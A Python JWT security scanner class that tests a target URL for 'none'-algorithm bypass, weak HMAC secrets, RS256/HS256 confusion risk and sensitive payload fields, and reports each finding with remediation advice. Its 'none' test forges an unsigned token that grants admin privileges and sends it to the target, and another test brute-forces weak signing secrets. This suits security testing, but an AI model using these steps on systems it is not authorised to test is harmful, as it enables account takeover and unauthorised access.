#!/usr/bin/env python3
"""
JWT Security Analyzer
- Algorithm confusion (none, HS256->RS256)
- Weak secrets
- JWT manipulation
- Expiration bypass
"""

import requests
import base64
import json
import hmac
import hashlib
import re

class JWTAnalyzer:
    def __init__(self, target_url):
        self.target = target_url
        self.vulnerabilities = []
        self.session = requests.Session()
        self.weak_secrets = ['secret', 'password', '123456', 'admin', 'test', '']
    
    def analyze(self, jwt_token=None):
        """Main JWT analysis"""
        # If no token provided, try to extract from cookies/headers
        if not jwt_token:
            jwt_token = self._extract_jwt()
        
        if not jwt_token:
            return []
        
        # Run all tests
        self._test_none_algorithm(jwt_token)
        self._test_weak_secret(jwt_token)
        self._test_algorithm_confusion(jwt_token)
        self._test_sensitive_data_exposure(jwt_token)
        
        return self.vulnerabilities
    
    def _extract_jwt(self):
        """Try to extract JWT from target"""
        try:
            response = self.session.get(self.target, timeout=10)
            
            # Check cookies
            for cookie in response.cookies:
                if self._is_jwt(cookie.value):
                    return cookie.value
            
            # Check Authorization header
            auth = response.headers.get('Authorization', '')
            if 'Bearer ' in auth:
                token = auth.replace('Bearer ', '').strip()
                if self._is_jwt(token):
                    return token
            
            # Search in response body
            jwt_pattern = r'ey[A-Za-z0-9_-]+\.ey[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
            matches = re.findall(jwt_pattern, response.text)
            if matches:
                return matches[0]
        except:
            pass
        
        return None
    
    def _is_jwt(self, token):
        """Check if string is a JWT"""
        parts = token.split('.')
        if len(parts) != 3:
            return False
        
        try:
            # Try to decode header
            header = base64.urlsafe_b64decode(parts[0] + '==')
            json.loads(header)
            return True
        except:
            return False
    
    def _decode_jwt(self, token):
        """Decode JWT (without verification)"""
        try:
            parts = token.split('.')
            
            # Decode header
            header = base64.urlsafe_b64decode(parts[0] + '==')
            header_data = json.loads(header)
            
            # Decode payload
            payload = base64.urlsafe_b64decode(parts[1] + '==')
            payload_data = json.loads(payload)
            
            return {
                'header': header_data,
                'payload': payload_data,
                'signature': parts[2]
            }
        except:
            return None
    
    def _test_none_algorithm(self, token):
        """Test 'none' algorithm bypass"""
        decoded = self._decode_jwt(token)
        if not decoded:
            return
        
        # Create token with 'none' algorithm
        none_header = {'alg': 'none', 'typ': 'JWT'}
        none_payload = decoded['payload'].copy()
        
        # Modify payload (e.g., escalate privileges)
        none_payload['role'] = 'admin'
        none_payload['isAdmin'] = True
        
        none_token = self._create_jwt(none_header, none_payload, signature='')
        
        # Test the token
        try:
            response = self.session.get(
                self.target,
                headers={'Authorization': f'Bearer {none_token}'},
                timeout=10
            )
            
            # If we get 200 instead of 401, 'none' algorithm accepted
            if response.status_code == 200:
                self.vulnerabilities.append({
                    'tool': 'jwt_analyzer',
                    'type': 'JWT None Algorithm',
                    'name': 'JWT Accepts "none" Algorithm',
                    'severity': 'critical',
                    'original_token': token,
                    'exploit_token': none_token,
                    'description': 'JWT signature verification can be bypassed using "none" algorithm',
                    'evidence': f'Status: {response.status_code}',
                    'remediation': 'Reject tokens with "none" algorithm. Always verify signature.',
                    'cvss': 9.8
                })
        except:
            pass
    
    def _test_weak_secret(self, token):
        """Test for weak HMAC secrets"""
        decoded = self._decode_jwt(token)
        if not decoded or decoded['header'].get('alg') != 'HS256':
            return
        
        parts = token.split('.')
        message = f"{parts[0]}.{parts[1]}"
        original_sig = parts[2]
        
        for secret in self.weak_secrets:
            try:
                # Compute signature with weak secret
                computed_sig = base64.urlsafe_b64encode(
                    hmac.new(
                        secret.encode(),
                        message.encode(),
                        hashlib.sha256
                    ).digest()
                ).decode().rstrip('=')
                
                if computed_sig == original_sig:
                    self.vulnerabilities.append({
                        'tool': 'jwt_analyzer',
                        'type': 'Weak JWT Secret',
                        'name': 'JWT Uses Weak Secret',
                        'severity': 'critical',
                        'secret': secret,
                        'description': f'JWT signed with weak secret: "{secret}"',
                        'remediation': 'Use strong, random secrets (256+ bits). Rotate secrets regularly.',
                        'cvss': 9.1
                    })
                    return
            except:
                pass
    
    def _test_algorithm_confusion(self, token):
        """Test HS256/RS256 algorithm confusion"""
        decoded = self._decode_jwt(token)
        if not decoded:
            return
        
        original_alg = decoded['header'].get('alg', '')
        
        # If RS256, try changing to HS256
        if original_alg == 'RS256':
            confused_header = decoded['header'].copy()
            confused_header['alg'] = 'HS256'
            
            # Note: Full exploitation requires public key, just detect config
            self.vulnerabilities.append({
                'tool': 'jwt_analyzer',
                'type': 'Potential Algorithm Confusion',
                'name': 'JWT Algorithm Confusion Risk',
                'severity': 'high',
                'current_algorithm': original_alg,
                'description': 'JWT uses RS256 - verify server rejects HS256 tokens',
                'remediation': 'Explicitly whitelist allowed algorithms. Never trust alg field.',
                'cvss': 7.5
            })
    
    def _test_sensitive_data_exposure(self, token):
        """Check for sensitive data in JWT"""
        decoded = self._decode_jwt(token)
        if not decoded:
            return
        
        payload = decoded['payload']
        sensitive_keys = ['password', 'secret', 'api_key', 'ssn', 'credit_card']
        
        found_sensitive = []
        for key in payload.keys():
            if any(sensitive in key.lower() for sensitive in sensitive_keys):
                found_sensitive.append(key)
        
        if found_sensitive:
            self.vulnerabilities.append({
                'tool': 'jwt_analyzer',
                'type': 'Sensitive Data in JWT',
                'name': 'JWT Contains Sensitive Data',
                'severity': 'medium',
                'sensitive_fields': found_sensitive,
                'description': f'JWT payload contains sensitive fields: {", ".join(found_sensitive)}',
                'remediation': 'Never store sensitive data in JWT. Use opaque tokens for sensitive operations.',
                'cvss': 5.3
            })
    
    def _create_jwt(self, header, payload, signature=''):
        """Create JWT token"""
        header_b64 = base64.urlsafe_b64encode(
            json.dumps(header).encode()
        ).decode().rstrip('=')
        
        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(payload).encode()
        ).decode().rstrip('=')
        
        return f"{header_b64}.{payload_b64}.{signature}"